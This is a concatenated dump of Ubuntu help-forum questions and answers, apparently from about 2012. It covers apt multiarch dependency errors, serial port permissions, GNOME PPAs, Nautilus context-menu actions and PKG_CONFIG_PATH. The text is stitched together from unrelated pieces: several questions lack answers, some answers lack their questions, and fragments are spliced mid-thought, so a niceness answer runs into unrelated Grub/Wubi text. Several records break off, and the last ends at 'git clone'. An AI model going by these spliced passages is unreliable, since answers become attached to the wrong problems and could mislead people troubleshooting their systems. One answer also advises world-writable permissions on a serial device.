I'm suspecting this only happens with 64 bit users.\nFor example, when trying to install wine or ia32-libs with apt-get, I get a lot of dependency errors. Doing a sudo apt-get -f install doesn't seem to do the trick, neither does using aptitude.\nThe errors I get is normally that the packages depend on some :i386 package, but installing those manually doesn't work either because they also have dependency issues (isn't APT supposed to do this automatically?!). I also downloaded CrossOver today and tried installing the .deb manually, but the dependency issues show up there as well.

So I found out what caused my problems. It was probably some PPAs with certain packages that created the dependency issues. While surfing randomly at Askubuntu last night, I came across an answer that fixed my problem.\nHere is the answer, just modified so it works for Ubuntu 12.10:\nFirst a downgrade is required and done with the following:\ncreate the 'preferences' file:\nsudo vi /etc/apt/preferences\n\nand insert the following lines:\nPackage: *       \nPin: release a=quantal*\nPin-Priority: 2012\n\nenter :wq to write the file. Pin-Priority must be greater than 1000.\nThen you may downgrade the offending applications with:\nsudo apt-get dist-upgrade\n\nAnd that was it. Installing wine, crossover and ia32-libs now work. Why this happened when I ran a freshly downloaded 12.10 version of Ubuntu live I don't know and don't understand.\nThank you all for trying to help!\n\nA: This drove me crazy as well.\nI installed Ubuntu 64-bit using plain debootstrap from a 32-bit Ubuntu lucid (booting a newer 64-bit kernel).\nAfter digging through forums and documentation I found out that I had to do:\ndpkg --add-architecture i386\n\n(actually I found a page on disabling multiarch and figured out that it was not enabled in the first place)\n\nA: I'm also using Ubuntu 12.10(64-bit), and I had installed both Wine and ia32-libs package without any problem.So this is not the problem of having 64-bit. You should try to install both \"wine 1.4.1\" and \"Ia32 shared libraries - transitional package\" through Ubuntu Software Center, like I did.\n\nA: I faced the similar problem when installing Skype in 12.04 64bit.\nI was stuck at the point where the ia32-libs was not installed and throws error message:\nCannot Install ia32-libs\n\nSolution is to try to update all the repositories. I did it via Synaptic package manager. \nReload all the repositories and try to install wine. This may solve your problem.\nIt worked for me. After that there was no error in installing ia32-libs package or ia32-multarch-libs.\n\nA: It seems you have multiple repositories in your APT sources list that contain wine packages. Combined with suboptimal APT preferences (defaults defined in /etc/apt/preferences) this can lead to installability problems. To fix these it might suffice to do the following.\nsudo apt-get -t quantal install wine1.4\n\nIf this does not suffice then temporarily remove from your sources list references to alternative wine repositories. You may, for example, have a file /etc/apt/sources.list.d/ubuntu-wine-ppa-quantal.list whose contents look like the following.\ndeb     http://ppa.launchpad.net/ubuntu-wine/ppa/ubuntu quantal main\ndeb-src http://ppa.launchpad.net/ubuntu-wine/ppa/ubuntu quantal main\n\nComment these lines out and try again to install the wine1.4 package.\n\nA: I found a fix for this and I hope it works for you. I simply installed first the GCC 4.7 multilib. After doing this, it seems WINE but first with a complaint about a broken package and after clicking apply again in Synaptic, it installs.\nI first installed:\ngcc-4.7-multilib g++-4.7-multilib gobjc++-4.7-multilib gobjc-4.7-multilib\n\nWhat I think happens is that during the installation of the multilib dev tools, it executes the correct command to configure the system to accept the i386 WINE libs that it requires. WINE is 32bit by default but I install both the 32bit and AMD64 and it seems to work great. My games play really smooth. I'm very happy with 12.10 + WINE + nVidia drivers.\nGood luck!\n\nA: It seems your current architecture is amd64 (dpkg --print-architecture), so you've to add i386 to the list of architectures for which packages can be installed without using --force-architecture.\nSo the full solution how to install wine, it would be\nsudo dpkg --add-architecture i386\nsudo add-apt-repository -y ppa:ubuntu-wine\nsudo apt-get update\nsudo apt-get install wine # or wine1.7\n\n", "Q: Cant change niceness even after editing limits.conf so what i did: \nin the terminal i typed: \nsudo su \n\n(used pass) then typed: \nnano /etc/security/limits.conf\n\nwent to bottom and added: \nUSER             -       nice            -20 \n(with my username not user and i spaced it properly) \nthen i restarted my comp, but it still didnt work\n\nA: Reading this link, I think you need not issue the command as su.

The reason is that it's not required when the only two OSes are Windows and a Wubi-installed Ubuntu, and it has led to some problems when users assumed they could boot Windows from Grub, when in fact you can't.\nIf you run sudo update-grub you'll see something like this:\nFound Windows 7 (loader) on /dev/sda2\nSkipping Windows 7 (loader) on Wubi system\n\nThis means that grub considers it to be a single OS situation, and therefore defaults to hiding the Grub menu.\nIf you want it to show, hold down the Shift key after selecting Ubuntu from the Windows boot manager, or change the settings in /etc/default/grub but I'd have to ask why you want to do this.\n", "Q: Lenovo z470 getting hot, after 12.04 install When I was using Windows 7 my notebook temperature was very good, it stayed very cool.

Can Ubuntu partition and format before installing itself on a Dell Dimension 4400 whose HD is wiped clean of Windows XP?\n\nA: The Ubuntu installer will always create and format an ext4 partition for itself unless it is explicitly told another partition scheme.  Look at the Partioning Wiki for more information.\n\nA: Yes, Ubuntu can create partitions and format them.\n\nA: Yes, the Ubuntu Disk or USB installer will handle this no problem. They have a tool called gparted, which can even do this without installing Ubuntu.\nGparted can format the drive , create or delete partitions, move partitions, add labels, etc.\nJust boot with the install media inserted and follow the prompts.

I've noticed that it uses as 1.5 times the disk space compared to when it was not encrypted. Is this problem caused by the eCryptfs and is there a way to deal with it?\n\nA: eCryptfs will add a small amount of header data to a file, so if you have many thousands of files this could explain some of the extra space being used. \nAlso, Linux allows files to be non-contiguous and these can have \"holes\" in them which don't use any space.  However, eCryptfs has to encrypt these holes (they are effectively zero blocks which are encrypted) and so this uses up more blocks than the original file that has holes in it.  Perhaps that is the reason for the overhead.\n", "Q: Ip Tunneling Driver I am trying to use a AppGate client on my Ubuntu 12.04.\nsome AppGate client services need IP Tunneling driver to be installed and running on the system in order to work.\nI have  downloaded IP Tunneling driver for Linux but do not know how start it.\nDoes anybody know how to run it?\nThanks in advanced.\n\nA: I have solved this issue.\nI found a  package (provided by appgate website )that contains script files and a ReadMe file describing the steps to do that. \nI followed the instruction from the readme file and it worked.\n", "Q: Is it possible to create two Gmail web-apps for two Gmail accounts?

They are just shortcuts that provide unity integration.\nHowever, you can be logged in to 2 or more e-mail accounts on one gmail account. You just need to click on your profile image in Gmail and select \"add account\" (or something like that). That's a quite simple solution. Though, I'm not sure it will privide the same Web App integration as I'm not using this feature at the moment.\n\nA: The webapps simply load a browser session.

I would like sync my loved songs on last.fm with the corresponding songs in Rhythmbox by giving them a particular rating in Rhythmbox.

The last.fm/libre.fm plug-in in Rhythmbox doesn't really know anything about what songs you have 'loved' on last.fm, or whether they relate to any songs in your local Rhythmbox library at all.\nIt would take a significant amount of development work I think, to implement this feature, and get it right.

I have Windows XP and Kubuntu 12.04 on my desktop. I use Gmail and Yahoo mail through Firefox. If I get an attachment using XP, I know how to navigate to C:/Program Files/XYZ/xyz.exe to open the attachment, and tick the Firefox dialog box so that future Xyz files, will automatically open in Firefox. In Kubuntu, the same dialog box appears, but it is not clear how to navigate to the Linux eqivalent of xyz.exe. I have to save the file first, when it will be opened on clicking (provided I have first correctly set SystemSettings>FileAssociations). I would prefer to choose which attachments I save, so need to know the Kubuntu folder which corresponds to XP's \"Program Files\". and the file/extension equivalent of xyz.exe. Firefox's help menu doesn't seem to have this information.\n\nA: Go to the Edit menu in Firefox and select Preferences.  Then select the General tab at the top of the Preferences window.  There is a section called Downloads, where you can set Firefox to download files to a specific folder, or have it ask every time where you want the file to download to.  If you set it to ask every time, then when you try to download a file it will give you an option to either download the file or open it, and you can check a box to have Firefox default to whatever behaviour you choose.\nEdit: I guess I misunderstood your question.\nI guess you saying that xyz is the program that you want to use to open the file that you click on, and you are looking for the location of the executable file for xyz.\nThere are a few locations to find program files (binary files): /bin, /usr/bin, /usr/local/bin are good places to start.

Then can I simply proceed by installing the same program compiling from source? Will this replace the previous version installed via deb package?\n\nA: Debian packages generally install the binaries and libraries in /usr/bin/ and /usr/lib directories. Whereas when you compile the softwares from source, you are able to specify the prefix for the directories in which you want to install it. In general, the /usr/local/bin/ and /usr/local/lib directories are default in standard gnu softwares / foss (sort of de-facto standard). You can compile the softwares by specifying the prefix while running configure command. \ne.g. Say you want to install the software in /usr/local/ prefix, you should run these commands:\n\n\n*\n\n*./configure --prefix=/usr/local\n\n*make\n\n*sudo make install\n\n\nYou can specify --prefix to be any directory e.g. it can be ~/.local/ or any other directory for that matter. \nNow you have two binaries with the same name but in different directories installed. Which one of these will be used when you invoke the command (binary file) name, depends on the PATH variable of your shell. If the directory you installed the software is before the standard /usr/bin/ directory in the PATH variable value, it'll be run and debian one'll not be run.\n  Check the PATH variable by running echo $PATH in terminal.\n", "Q: Initial root password and DISPLAY?

Since this didn't work I tried logging in as root (user name) and I realize I don't know the password. So I have two questions. One, on initial installation what does the root password become? Two, what do I do about the DISPLAY problem?\n\nA: First of all: you don't have to know the root's password, use your own with sudo command.\nFor shutdown: sudo shutdown -P now, for example.\nIf you need a password for root, then issue:\n1. sudo su\n2. passwd root, and change the password.\n", "Q: Virtualbox vnc options I have been looking for a way to connect to my virtualbox vm guest by a vnc client.\nBy that I mean, not installing a vnc client/server on the vm, but as an addition to virtualbox; The same way as vps providers do.\nI have searched for this, nothing came up.\nHow do I do this?\n\nA: Is vnc a requirement? or are you simply referring to being able to access the \"physical screen\" of your virtual machine without having to use a network enabled vm?\nIf so, The Virtual Box way of doing it ,is using Oracles implementation of the remote desktop protocol (RDP) which they call VRDP.\nThis allows you control of the guest with any rdesktop client.\nYou can see Oracles instructions for installing the vrdp here\nIf you really require / prefer VNC , or dont want the proprietary vbox extension\nyou can enable vnc support with some tinkering according to this post\n\nA: I'm having the same problems because the PEUL is not an option for me.

I haven't been able to change the brightness of my monitor since putting Ubuntu on it. I started off with 12.04 and then decided to see if 12.10 would fix the issue. The internet is also a fair bit slower than I am used to, especially when downloading. Apart from these two issues, everything goes very smoothly.\nIf anyone could offer any advice or solutions, I would be very grateful.\n\nA: Sorry for not providing an answer, but I have a question for you. What tutorial did you follow and what other issues did you experience? I want to do the same thing (latest Ubuntu on a late 2010 Macbook Air 3.2).\nThere seem to be so many old and half finished tutorials out there that I am unsure how to proceed. Is there a definitive write-up that can be trusted?\nGood luck with your issues, I will be checking back.\nBTW did you check this: \nLook for EnableBrightnessControl\n\nA: Oh, I had the same problem, and the pointer of \"Roy Prins\" helped me. \nYou can ignore all previous \"guidelines\". 12.10 works out of box, without any \"post-install things\". But the only problem is, with nvidia-driver, you lost the backlight control. (That was the only problem I had, on my 2010 macbook air 11 inch. If I use nuoveau driver, it has the backlight, but some vertical lines comes up. So using NVidia driver is the best bet for Macbook Air 3,1.) \nThe solution for backlight is simple. As Roy pointed out, add option for \"EnableBrightnessControl\". For example, my /etc/X11/xorg.conf \ntailblues@gilsaire:/etc/X11$ cat xorg.conf\nSection \"Device\"\n    Identifier  \"Default Device\"\n    Driver      \"nvidia\"\n    Option      \"NoLogo\"    \"True\"\n    Option      \"RegistryDwords\"    \"EnableBrightnessControl=1\"\n    BusID       \"PCI:2:0:0\"\nEndSection\ntailblues@gilsaire:/etc/X11$ \n\nAnd then, it started working for me! \n", "Q: Ubuntu One - Files API - Cloud - More detailed info somehwere? I am just starting on a mobile app for Ubuntu One, and I'm reviewing the info at\nhttps://one.ubuntu.com/developer/files/store_files/cloud\nI find the information a bit lacking though. It's a nice reference, but for someone not familiar with it, I had to goggle search to find out what a \"volume\" was exactly (its kind of obvious, but never hurts to know the specifics)\nThere's also things like:\n\nGET /api/file_storage/v1/volumes\nReturn a JSON list of Volume Representations, one for each volume.

I could just write a little proof of concept app to answer some of these questions... but I prefer not to unless I have to.\nThanks\n\nA: There isn't yet another page, although I'm working on it. (And yes, a JSON array.)\nI'd be happy to chat over this stuff with you; it would be useful to me to get your feedback on what you'd like to see in the documentation (sample request/response pairs is a good idea), and hopefully useful to you as well. There are various example apps around; if you're developing on Ubuntu, you may find u1oauthrequest, in the ubuntuone-couch package, useful for testing: u1oauthrequest https://one.ubuntu.com/api/file_storage/v1/~/Ubuntu%20One will be the node for your Ubuntu One folder, for example. u1fn9 shows accessing the file storage API from JavaScript in a QML app; the source for the U1 Android and iOS apps is open and on Launchpad; u1ftp is a Python example of accessing the files API.\n", "Q: Serial port terminal > Cannot open /dev/ttyS0: Permission denied I had Windows XP on this box and it failed. Thinking it was corrupted OS I tried to reinstall, and it failed. But then I tried to install Ubuntu, and I could not run it from the USB or from the HD. \nDid the mem test and found out one of my 512MB sticks (had 2) failed. I removed the bad one and was able to install Ubuntu but it was sluggish. \nI was trying to quickly setup my packet radio for Hurricane Sandy. Downloaded the Serial Port Terminal and was able to get some use but the system kept locking up. So Installed Xubuntu next to it, planning on running out the next day to get RAM for the box.

If you don't belong to the dialout grup then add yourself to it, for example:\nsudo gpasswd --add ${USER} dialout\n\nYou then need to log out and log back in again for it to be effective.  Then see if it fixes your problem.\n\nA: Had a look around various forums and it looks to be a bug related to permissions.  Here's how I got around the problem (long version).  You WILL need BOTH cu and setserial packages installed.\nIn three terminal tabs, monitored output from # tail -f /var/log/messages\nThat's how we know if we have a /dev/ttyUSB0 or not.\nIn the second tab, simply ran a loop to  ls -l this device to see it's permissions and it's group ID is 'dialout'.  THIS is the critical bit.  For some reason, your user MUST use this GID to do the cu, so...\nIn the third tab, as root, did # newgrp dialout (to correspond with the GID of dialout). Tested with  # touch /tmp/anything ... doing ls -l on this file shows it is created by root with a dialout group, so we're ready to ... # cu -l /dev/ttyUSB0\nIn my case I needed to hit return again to see the expected prompt, in other cases speed may need to be specified.\n\nA: The only solution that works for me is to: (every time I boot the machine)\nsudo chmod 666 /dev/ttys0\n\nIt really needs to be fixed at time of installation. I'm on 15.10 and have tried 16.04 LTS, still the same there. Seems like such a simple fix. \nThe older versions 10.04LTS did not have this problem.\n\nA: Here is the solution:\nI had just updated my operating system to Ubuntu 18. normally I would install arduino IDE through the Arduino web sight because the one provided via Ubuntu Software portal was always an older version, and I wanted the newest features and board support. However, since I just installed the newest operating system, I figured that the official software center from ubuntu would have the newest version of the IDE listed, and it did.\nNow to the juicy part! Both my laptop and my desktop had the same problems accessing the serial ports. i had done the make user part of the dial-up group, and set permissions for the serial port, but always had to  log out then back in, do it all again every time i rebooted! NOT FUN!.\nThis time, it didn't work. Even in the software center the permissions option for the software shows the serial port \"disconnected\". no option to allow permission to the port even after all the permissions were granted manually through the terminal window using sudo. \nI decided to uninstall the Arduino IDE from the software center, and install it from the web sight, so i did. This time I read the install files, just to see if it mentions permissions for the serial port or not, *****of course it did! ******\nall the ports are set with full access permissions, user access across the board. Turns out this was the answer. after running the arduino-linux-setup.sh file provided by arduino, all serial port problems were solved. the following is an excerpt from the arduino-linux-setup.sh file;\necho \"\"\necho \"******* Add User to dialout,tty, uucp, plugdev groups *******\"\necho \"\"\n\nsudo usermod -a -G tty $1\nsudo usermod -a -G dialout $1\nsudo usermod -a -G uucp $1\nsudo groupadd plugdev\nsudo usermod -a -G plugdev $1\n\n\nacmrules () {\n\n    echo \"\"\n    echo \"# Setting serial port rules\"\n    echo \"\"\n\n    cat <<EOF\n    \"KERNEL=\"ttyUSB[0-9]*\", TAG+=\"udev-acl\", TAG+=\"uaccess\", OWNER=\"$1\"\n   \"KERNEL=\"ttyACM[0-9]*\", TAG+=\"udev-acl\", TAG+=\"uaccess\", OWNER=\"$1\"\n   EOF\n\n}\n\nso you see even the KERNEL is effected. My suggestion:\ninstall from the arduino ide web site. ignore the software center at this time, until it is repaired. Yes the SOFTWARE CENTER is not allowing permmisions to the serial port during install, and forever after.\nProblem Solved!\n\nA: The answer is simple. You need to add your user to two groups to have access to the usb ports. These groups are dialout and tty:\nsudo usermod -a -G dialout <user>\nsudo usermod -a -G tty <user>\n\nReplace <user> with the actual username in those commands.\nAnd after this, reboot.\n\nA: On Ubuntu 18.04, I fixed this issue with the following commands:\nsudo usermod -a -G tty $USER\nsudo usermod -a -G dialout $USER\n\nAnd after this, reboot.\nIf you still have issues, try to debug with:\nstrace -ff <COMMAND> > strace.txt 2>&1\n\nAnd look for \"denied\" in the strace.\n\nA: In my case the problem still exist, even when I add my user to group using:\nSo when I use :\nsudo gpasswd --add ${USER} dialout\n\nand when I type: groups I got this result: \nilyahoo adm cdrom sudo dip plugdev lpadmin sambashare\n\nBut when I type id -Gn ilyahoo the putput is: \nilyahoo adm tty dialout cdrom sudo dip plugdev lpadmin sambashare \n\nI know that there is a problem that I don't know what is it honestly.\nTo get a solution I just typed\nnewgrp ilyahoo\n\nand the problem was fixed.\n\nA: I had the same issue, and tried every piece of advice from here. The only thing that worked for me was uninstalling the IDE that I had downloaded from Ubuntu Software, and reinstalling the software from the Arduino site.\n\nA: And if all of the above does not solve the problem, this should:\nsudo chown $USER: /dev/ttyS0\n\nor\nsudo chown :dialout /dev/ttyS0\n\n", "Q: Software raid5 recovery I'm very new to Ubuntu and Linux in general, so please forgive my noobness.\nI'm running an Ubuntu server, where the OS is installed on a SSD drive.

What code should I write in .bashrc so that this is achieved?\n\nA: On many linux system echo $TERM return xterm see stazher post above.\nTo get actual terminal in use, do this:\n1: Close every terminal instance currently running.\n2: Open new terminal using your usual method.\n3: Enter command as follows:\nps -o 'cmd=' -p $(ps -o 'ppid=' -p $$)\n4: Return should be something like such:\nlxterminal --geometry=135x20\nHere is breakdown:\nSo: ps is \"process status\"\nps option -o is Display information associated with the space or\ncomma separated list of keywords specified. Sounds complicated, but\nis not really. (space or comma) separated (list of keywords) specified.\nSo, (list of keywords) is 'cmd=' Only one keyword in list.  So, just asking to display command to open terminal.\nps option -p is \"by process id\"  Wow this is very nice option for ps.  Problem is, you must pass to ps this process id.  So, how to get process id?  We unwrap expression  $(ps -o 'ppid=' -p $$)\nHere we must start to think a little deeper.  I wish I invented this bash one-liner, but I did not.  I think I stole it from https://wiki.archlinux.org/ somewhere, I could not find again. Those guys are awesome, but many times I cannot understand what they say to do until after much study. What we can do, is to understand it now, because I will explain.\nso we know $ is expansion operator in bash. I like to think \"un-wrap\". So, $(foo -opt bar) will unwrap, or expand, \"foo -opt bar\". But in bash, single round brace (...) opens subshell.\nSo, $(foo -opt bar) expands \"foo -opt bar\" as run in daughter shell.  Very weird and difficult to understand.\nOK, so now we are running almost identical command again, ps -o 'ppid=' -p $$ but this time ps, process status, shows us what he can see from within daughter shell instance.\n-o list of keywords, only one keyword as before, but ppid= this is asking directly for process id of parent shell!!  From WITHIN DAUGHTER SHELL! Very clever, yes?  I am so excited when I can understand this!\n-p again, \"by process id\" and in bash $$ is the process id.\nIf you call ps -o 'ppid=' -p $$ , or any other command asking for $$ directly from the first shell, he might say pid=1, or the pid from xWindow, or from your desktop program, or you maybe get actual pid of shell. If you ask many times, you maybe get different answer each time!\nBut, if you invoke a daughter and ask her \"Who's your Daddy\" she will tell you!  Very clever.

My ~/.bashrc script is actually only one simple line, all the echo commands are just for fun.  How to explain...\nAny term when starting reads ~/.bashrc , and executes whatever commands he will see in .bashrc.  So, no matter which term is called, he will read .bashrc and execute the commands, so only structure needed in .bashrc would be to modify the behavior of or exclude one term or another.

For eg, opening a file as administrator is\n  a \"relevant\" task but starting a nuclear war from Nautilus is not !\nInformally, it is easy to extend Nautilus if your task falls in the\n  following categories : Adding new entries in context menus (or in\n  toolbar) that involve selected files/folders or current folder, add\n  additional custom properties to files and display those details in\n  list view, modify the properties page to display additional tabs with\n  information etc. There are other possibilities but these are the most\n  common ones.\nIf the above discussion sounds very abstract let us give some examples : \n  \n  \n*\n  \n*Open a terminal in the current folder or open the selected file as root. \n  \n*Selecting a few audio files and adding them to Rhythmbox \"Now Playing\" queue. \n  \n*Selecting a few files and sending them to thunderbird for attachment \n  \n*Display IMDB details about the selected movie file in the property page etc.\n  \n  \n  The above examples show a gradient of use cases in the order of\n  complexity. Some of them are so simple that they can automated using\n  simple means. Tasks like (4) are tricky and need powerful tools.\n  Selecting the right tool is important and we will discuss how to\n  select the best approach.\nDifferent Approaches to Customize Nautilus Context Menus Like\n  everything in Linux, there is always a variety of ways to customize\n  Nautilus ranging from simple to complex. In this post, we will discuss\n  the three most common approaches :\n  \n  \n*\n  \n*Using tools like nautilus-actions \n  \n*Using Nautilus scripts \n  \n*Using extensions written in nautilus-python\n  \n  \n  As before, all my discussion will be focused on Ubuntu but it should\n  be relatively easy to apply to other Linux distributions.\nCustomizing Nautilus context menu using  nautilus-actions This is\n  probably the easiest method. All you need to know is the shell command\n  or script to perform the task. Nautilus actions provides an intuitive\n  GUI to decide on the filters and the actions to be performed. This\n  approach works best if the following conditions are met :  a. the task\n  you want to be automated is easily translatable in command line  b.\n  the command line utility accepts the arguments in a relatively simple\n  form (eg space separate arguments etc)  c. The command line utility\n  depends only on information pertaining to the selected file/folder.\nTo install the package, type the following at terminal (or install\n  this package from Synaptic) : \n sudo apt-get install nautilus-actions\n\nOnce the package is installed it can be accessed at System ->\n  Preferences -> Nautilus Actions Configuration. I will only give a\n  basic discussion here as there is a decent tutorial on how to create a\n  new action at How To Add Custom Functionality To Nautilus.\nLet us take a simple example – If I right click on a folder , I want a\n  new menu which says, \"Open Terminal Here\" and when it is clicked, a\n  new terminal must be opened and the working directory of the terminal\n  must be the selected folder. The first step is to find if it can be\n  expressible in a \"single\" command. Find the name of the command to\n  invoke the terminal – it is called gnome-terminal. Read the man page\n  to find that it accepts an argument \"–working-dir\". When provided, it\n  starts the terminal in specified folder.\nNow start the Nautilus Action from System -> Preferences -> Nautilus\n  Actions Configuration . The steps are :  a. Create an action.  b. In\n  \"Action\" tab, give the action some name and select \"Display item in\n  selection context menu\". If you want it to be visible in the toolbar,\n  it can done too ! Select \"Display item in toolbar\" and choose some\n  icon.  c. In the command tab, give \"gnome-terminal\" as path and\n  parameters as \"–working-directory=%d/%f\". The %d and %f are special\n  codes that will be expanded when the command is invoked. To see other\n  special codes and what they mean, click on the \"Legend\" button.  d. In\n  \"Conditions\" tab, select \"Only Folders\".\nNow open a new Nautilus window , select a folder and right click.\n  Presto ! You will see a \"Open Terminal Here\" menu. Select it and you\n  will see a new terminal open with the selected folder as its current\n  directory !\n\n", "Q: unable to use/locate sudo I am using ubuntu 12 and am unable to use sudo anymore (it was working a few days ago) but apparently got corrupted somehow.

I use Ubuntu 12.04 with Gnome 3.4.1.\nI've tried to upgrade to Gnome 3.6 to no avail.\nI added this to my /etc/apt/sources.list file:\ndeb http://ppa.launchpad.net/gnome3-team/gnome3/ubuntu precise main\nThen I ran \nsudo apt-get update \nsudo apt-get upgrade\n\nThen restarted the system.\nBut when I run:\ngnome-shell --version\n\nIt continues to print\nGNOME Shell 3.4.1\n\nWhat can I do ?\nI need to upgrade to 3.6 in order to be able to use an extension that allows the app switcher to only switch between apps in the current workspace.\n\nA: First you need to remove the line that you added to the sources.list.  PPAs are added differently.  From a terminal add the PPA by doing: sudo add-apt-repository ppa:gnome3-team/gnome3 and sudo add-apt-repository ppa:ricotz/testing\n .  Then run sudo apt-get update and sudo apt-get upgrade.\n\nA: To update to Gnome 3.6, you need to add these two PPAs:\nsudo add-apt-repository ppa:ricotz/testing\nsudo add-apt-repository ppa:gnome3-team/gnome3\n\nThen run:\nsudo apt-get update\nsudo apt-get upgrade\nsudo apt-get dist-upgrade\n\n\n\n*\n\n*The dist-upgrade command is needed because packages that aren't installed must be pulled in as dependencies for the upgrade to work. However, this also makes it possible for packages to be removed--which might also be necessary--so it's important to look at what packages, if any, it says will be uninstalled.\n\n", "Q: Ubuntu Software Center downloads something when installing from a .deb file I wanted to install winusb from http://congelli.eu/prog_info_winusb.html\nI downloaded the deb file, the latest was available for precise(I amrunning 12.10)\nI opened the .deb file(390 kb) in Ubuntu Software Manager and clicked on install. Then I switched to the progress tab and saw this. USC showed that it was downloading data of size 3.9 MB.\n\nCan someone explain? Was USC just downoading the latest updates and just showed that under the current operation?\n\nA: There are two possibilities here. First is that there are unmet dependencies that Ubuntu Software Center is downloading and installing first. The alternate (less likely) possibility is that there is a newer version in the repository and Ubuntu Software Center took it upon itself to use that version instead. (This probably isn't at all likely, I just really hate that program and will assume the worst).\na quick way to check would be to uninstall it, then run \nsudo dpkg -i ./path/to/deb.deb\n\nand it will only half-install if there are unmet dependencies. You can resolve these with\nsudo apt-get install -f\n\nEdit:\nAlternately you could uninstall it, clear your apt cache and then disconnect from the internet while installing it and see what USC complains about\n", "Q: console version of sysinfo Is there a console, text-only version of the sysinfo program or other similar utility? I am mostly interested in high-level info like RAM and CPU.\n\nA: lshw should be what you are looking for.\n", "Q: PKG_CONFIG_PATH environment variable \nConsider adjusting the PKG_CONFIG_PATH environment variable if you\n  installed software in a non-standard prefix.\n\nWhat does this mean ?\n\nA: It seems to me that most of the answers have too much information than needed.\nThe software that one installs may (and usually does) rely on some libraries and/or headers and the System uses pkg-config to find them.\nSaid so, pkg-config looks for this files in pre-defined (default) system's directories. Those folders are \"prefix\". E.g. a library that has prefix /usr/local is expected to have headers in /usr/local/include, and the library itself will be in /usr/local/lib. \npkg-config however looks for libraries also in directory listed in the environment variable PKG_CONFIG_PATH.\nThen if you install software outside the default list of folders you had to \"adjust\" the list, namely add your directories to PKG_CONFIG_PATH\n$ export PKG_CONFIG_PATH=$PKG_CONFIG_PATH:<your-directory>\n\nFor more info, you can look here and here\n\nA: To see where pkg-config (version 0.24 or later) searches for installed libraries by default, use the following command:  \npkg-config --variable pc_path pkg-config\n\nTo add to that path, set the PKG_CONFIG_PATH environment variable.  The man file states PKG_CONFIG_PATH is:\n\nA colon-separated (on Windows, semicolon-separated) list of\n  directories to search for .pc files. The default directory will always\n  be searched after searching the path; the default is\n  libdir/pkgconfig:datadir/pkgconfig where libdir is the libdir where\n  pkg-config and datadir is the datadir where pkg-config was installed. \n\n\nA: The first answer is not technically explicit enough.  From the man page (open a terminal, type man pkg-config):\n\n\npkg-config retrieves information about packages from  special  metadata files.\n     These  files  are named after the package, and has a .pc extension.   On  most\n     systems,  pkg-config  looks in /usr/lib/pkgconfig, /usr/share/pkgconfig, \n     /usr/local/lib/pkgconfig and /usr/local/share/pkgconfig for these files. It\n     will additionally look in the colon-separated (on Windows, semicolon-separated)\n     list of directories specified by the PKG_CONFIG_PATH environment variable.\n\n\nSo the pkg-config program is not in the PKG_CONFIG_PATH directory; however, if you install a library, for the information to use it in an automake script to be accessible it needs to be in a directory pkg-config is aware of.\n\nA: PKG_CONFIG_PATH is a environment variable that specifies additional paths in which pkg-config will search for its .pc files.\nThis variable is used to augment pkg-config's default search path. On a typical Unix system, it will search in the directories /usr/lib/pkgconfig and /usr/share/pkgconfig. This will usually cover system installed modules. However, some local modules may be installed in a different prefix such as /usr/local. In that case, it's necessary to prepend the search path so that pkg-config can locate the .pc files.\nThe pkg-config program is used to retrieve information about installed\nlibraries in the system. The primary use of pkg-config is to provide the necessary details for compiling and linking a program to a library. This metadata is stored in pkg-config files. These files have the suffix .pc and reside in specific locations known to the pkg-config tool. \nTo check the PKG_CONFIG_PATH value use this command: \necho $PKG_CONFIG_PATH\n\nTo set the PKG_CONFIG_PATH value use:\nexport PKG_CONFIG_PATH=/usr/lib/pkgconfig\n\nor\nexport PKG_CONFIG_PATH=/usr/local/lib/pkgconfig\n\n\nA: You're trying to build a piece of software, let's say Widget.  Widget relies on another library, libcog for the sake of argument.  Widget's build process (probably a configure script) is using pkg-config to determine how to use libcog.  pkg-config doesn't know anything about libcog.\nIf libcog isn't installed, that's your problem.  There is a good chance that a standard install of libcog will fix the problem. Depending on your system, you may need to install an addition \"developer\" version of the package; it often has \"-devel\" or \"-dev\" at the end, so if you install \"libcog\", you might also need to install \"libcog-devel\".\nIf libcog is installed, it's probably not installed in a way that pkg-config can find it.  There is probably a libcog.pc file somewhere on your system.  For the sake of argument, it's at /opt/cog/lib/pkgconfig/libcog.pc.  In that case, you can tell pkg-config about it by setting the PKG_CONFIG_PATH to the directory holding libcog.pc.  So in a Bourne shell or similar, something like\nexport PKG_CONFIG_PATH=$PKG_CONFIG_PATH:/opt/cog/lib/pkgconfig/\n\nOnce that's done, re-running the command that failed will hopefully work.\nIf libcog is installed, including the libraries and header files, and you don't have a libcog.pc file, things are going poorly.  Presumably a standard install of libcog includes the information, or else Widget wouldn't rely on it.  I'd first investigate reinstalling libcog.  It is possible to manually create the libcog.pc file, but getting it right is difficult and highly specific to a given library.\n\nA: I looked at the man-page on my 64-bit system and got a bit confused. It said in one line: \n\npkg-config  retrieves  information  about packages from special\n         metadata files. These files are named after the  package,  with\n         the  extension  .pc. By default, pkg-config looks in the direc‐\n         tory prefix/lib/pkgconfig for these files; it will also look in\n         the  colon-separated  (on Windows, semicolon-separated) list of\n         directories specified by the PKG_CONFIG_PATH environment  vari‐\n         able.\n\nI had assumed that it alwas looks in the directories lib/pkgconfig. Turns out its the directories themselves.\nIn my case, I was trying to compile the hello world gtk tutorial.\nI locate the file i want e.g.\nlocate gtk | grep '\\.pc'\n\nAmong the results are:\n\n/usr/lib/x86_64-linux-gnu/pkgconfig/gtk+-3.0.pc\n\nFinally was to do an export.\nexport PKG_CONFIG_PATH=/usr/lib/x86_64-linux-gnu/pkgconfig/\n\n\nA: It means you're trying to build something from source, and it can't find all of the dependencies it needs. The pkg-config script it uses to find the development files for those libraries, outputs this message.\n\nA: I was trying to install the latest version of axel and I ran ./configure and I got this:\nconfigure: error: Package requirements (openssl) were not met:\n\nNo package 'openssl' found\n\nConsider adjusting the PKG_CONFIG_PATH environment variable if you\ninstalled software in a non-standard prefix.\n\nAlternatively, you may set the environment variables SSL_CFLAGS\nand SSL_LIBS to avoid the need to call pkg-config.\nSee the pkg-config man page for more details.\n\nSo I tried: \n$ pkg-config --cflags openssl\n\nand I got:\nPackage openssl was not found in the pkg-config search path.\nPerhaps you should add the directory containing `openssl.pc'\nto the PKG_CONFIG_PATH environment variable\nNo package 'openssl' found\n\nAs obvious I had openssl installed (sudo apt-get install openssl) But on the above output as you can see it states \"No package 'openssl' found\".\nSo to make sure I did:\nfind / -type f -name \"*.pc\" |& grep -iv permission | grep openssl\n\nTurns out I need some other package for sure, so a little googling and I found that I had to install this package:\nsudo apt-get install libssl-dev\n\nAnd all this had nothing to do with changing pkg-config path env variable.\n\nA: Those who are using https://github.com/confluentinc/confluent-kafka-go\nPlease follow the installing librdkafka\n\n\n*\n\n*git clone 